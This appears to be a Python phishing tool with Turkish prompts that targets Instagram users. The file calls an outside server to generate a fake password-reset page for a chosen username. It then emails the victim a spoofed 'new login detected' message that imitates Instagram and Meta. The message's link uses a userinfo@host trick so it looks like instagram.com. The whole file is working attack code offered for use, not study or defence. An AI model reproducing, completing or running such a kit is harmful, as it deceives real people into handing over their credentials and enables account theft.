import requests, os, json, sys, time

os.system("clear")
os.system("chmod +x main.py")
os.system("pip install requests")
os.system("clear")

def loading_animation():
    symbols = ["-", "|", "/", "\\"]
    for i in range(1, 21):  # Adjusted the range for a smoother animation
        sys.stdout.write('\r')
        sys.stdout.write('-' * i + symbols[i % len(symbols)])
        sys.stdout.flush()
        time.sleep(0.1)  # Adjusted the sleep time for a faster animation

print("""
            ███████╗███████╗██████╗ ██╗████████╗
            ██╔════╝██╔════╝██╔══██╗██║╚══██╔══╝
            █████╗  █████╗  ██████╔╝██║   ██║   
            ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║   
            ██║     ███████╗██║  ██║██║   ██║   
            ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
                                                
            """)

print("""
1--->Instagram
0--->Exit
""")
print("MORE is COMING SOON...")

seçim = input("Seçiminiz--->")

if seçim == "0":
    print("Çıkış Yapıldı")
else:
    if seçim == "1":
        # Kullanıcıdan mail al
        mail = input("Mail Adresiniz--->")

        # Kullanıcıdan to adresini al
        to = input("Hedef Kullanıcının Maili (boş bırakmak için enter'a basın)--->")
        kullanicismi = input("Hedef Kullanıcının İnstagram İsmi--->")

        # Eğer to boş değilse mail gönderme apisi kullan
           
        # Mail gönderme apisi kullanılmazsa devam et
        ozelurl = input("Özel Url (instagram-com gibi)--->")
        print("\033[32m|")
        loading_animation()

        api_url_sayfa = "http://smmslowy-001-site1.atempurl.com/api/newpages.php"
        params_sayfa = {"mail": mail, "userss": kullanicismi}

        response_sayfa = requests.get(api_url_sayfa, params=params_sayfa)

        if response_sayfa.status_code == 200:
            print("""
            ███████╗███████╗██████╗ ██╗████████╗
            ██╔════╝██╔════╝██╔══██╗██║╚══██╔══╝
            █████╗  █████╗  ██████╔╝██║   ██║   
            ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║   
            ██║     ███████╗██║  ██║██║   ██║   
            ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   
                                                
            """)
            
            sayfa = f"socials.con.tc/resetpassword/{kullanicismi}.php"
            
            if to:
                api_url_mail = "http://smmslowy-001-site1.atempurl.com/mail/mail.php"

                data_mail = {
                    'to': to,
                    'subject': "İnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
                    'body': f'''
		
 
Yeni Bir Giriş Yapıldığını Fark Ettik, {kullanicismi}
 
Genellikle kullanmadığınız bir cihazdan giriş yapıldığını fark ettik.
 
 

 
POCO X3 PRO · Instagram · Istanbul, Turkey
 
 
Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına erişemeyeceksiniz. Bu ayarlara daha önce giriş yaptığınız bir cihazdan yine erişebilirsiniz.
 
Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin! 

Hesabınızı Kurtarmak İçin: https://{ozelurl}@{sayfa}
   

© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
Bu mesaj {to} adresine {kullanicismi} için gönderilmiştir. Bu sizin hesabınız değil mi? Bu hesaptan e-posta adresinizi kaldırın.
                '''
                }

                headers_mail = {'Content-Type': 'application/json'}

                response_mail = requests.post(api_url_mail, data=json.dumps(data_mail), headers=headers_mail)
            
                print(f"\033[31m\nUrl: https://{ozelurl}@{sayfa}")
        else:
            print(f"Hata! HTTP durumu: {response_sayfa.status_code}")
            print("API yanıtı:", response_sayfa.text)
    else:
        print("Geçersiz seçim. Lütfen 1'i seçin.")

    print("Programı sonlandırmak için 'e' tuşuna basın.")
    kapat_secimi = input("Seçiminiz--->")

    if kapat_secimi.lower() == "e":
        print("Program kapatılıyor...")
        sys.exit(0)
    else:
        print("Program devam ediyor.")
